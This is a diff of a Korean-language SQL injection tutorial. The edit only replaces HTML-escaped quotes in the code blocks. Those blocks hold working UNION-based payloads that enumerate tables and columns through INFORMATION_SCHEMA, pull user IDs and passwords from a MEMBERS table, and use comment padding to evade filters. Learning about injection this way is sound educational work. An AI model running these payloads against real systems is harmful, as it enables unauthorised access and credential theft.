@@ -68,7 +68,7 @@ SELECT * FROM TABLE1 WHERE ADDRESS = '' OR UNION SELECT 1 --
 해당 주소 찾기의 데이터베이스의 칼럼은 총 5개 인 것을 확인했으므로, 앞으로의 `UNION`은 5개로 한정하여 검색한다.
 
 ```SQL
-&#39; UNION SELECT 1, 2, 3, 4 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --
+' UNION SELECT 1, 2, 3, 4 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --
 ```
 <p align="center">
 <img src ="https://user-images.githubusercontent.com/78135526/178675478-002543bc-db45-402a-96d3-89a287489e82.png" width = 350>
@@ -83,7 +83,7 @@ SELECT * FROM TABLE1 WHERE ADDRESS = '' OR UNION SELECT 1 --
 ### 4. Union으로 칼럼 명 확인
 
 ```SQL
-&#39; UNION SELECT 1, 2, 3, 4, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS --
+' UNION SELECT 1, 2, 3, 4, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS --
 ```
 <p align="center">
 <img src ="https://user-images.githubusercontent.com/78135526/178677782-b75535bd-c524-40e6-a5b3-50513a711aa0.png" width = 350>
@@ -96,7 +96,7 @@ SELECT * FROM TABLE1 WHERE ADDRESS = '' OR UNION SELECT 1 --
 * 하지만, 너무 많은 것을 가져 오기 때문에, `WHERE` 조건을 이용하여 원하는 정보만 추출해야한다.
 
 ```SQL
-&#39; UNION SELECT 1, 2, 3, 4, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'MEMBERS' --
+' UNION SELECT 1, 2, 3, 4, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'MEMBERS' --
 ```
 
 ### 5. 주요 정보 추출
@@ -106,7 +106,7 @@ SELECT * FROM TABLE1 WHERE ADDRESS = '' OR UNION SELECT 1 --
 해당 테이블명과 칼럼명을 활용해 `UNION SELECT`를 해본다.
 
 ```SQL
-&#39; UNION SELECT 1, 2, 3, USER_ID, PASSWD FROM MEMBERS --
+' UNION SELECT 1, 2, 3, USER_ID, PASSWD FROM MEMBERS --
 ```
 
 <p align="center">
@@ -132,7 +132,7 @@ UNION 구문을 사용하다보면 글자 수가 비정상적으로 길어진다
 이 방법도 우회가 가능하다.
 
 ```SQL
-&#39;/**/UNION/**/SELECT/**/1,2,3,USER_ID,PASSWD/**/FROM/**/MEMBERS/**/--
+'/**/UNION/**/SELECT/**/1,2,3,USER_ID,PASSWD/**/FROM/**/MEMBERS/**/--
 ```
 
 * 주석을 활용한 방법이 대표적인 예시이다.
